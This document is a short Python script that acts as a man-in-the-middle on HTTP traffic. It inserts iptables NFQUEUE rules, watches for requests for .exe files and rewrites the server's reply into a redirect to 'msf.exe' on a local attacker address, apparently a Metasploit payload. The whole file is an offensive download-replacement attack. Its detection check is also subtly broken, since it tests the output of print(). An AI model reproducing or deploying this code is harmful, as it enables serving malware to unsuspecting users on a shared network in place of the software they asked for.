#!/usr/bin/env python3

import scapy.all as scapy
import netfilterqueue
import subprocess

ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("HTTP Request")
            if ".exe" in print(scapy_packet[scapy.Raw].load.decode("utf-8")):
                print("[+] exe downloading")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("HTTP Response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                print("[+] Replacing files")
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[
                    scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: http://192.168.0.x:port/msf.exe\r\n\r\n".encode(
                    "utf-8")
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()


def init():
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num=0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num=0", shell=True)
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num=0", shell=True)


init()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()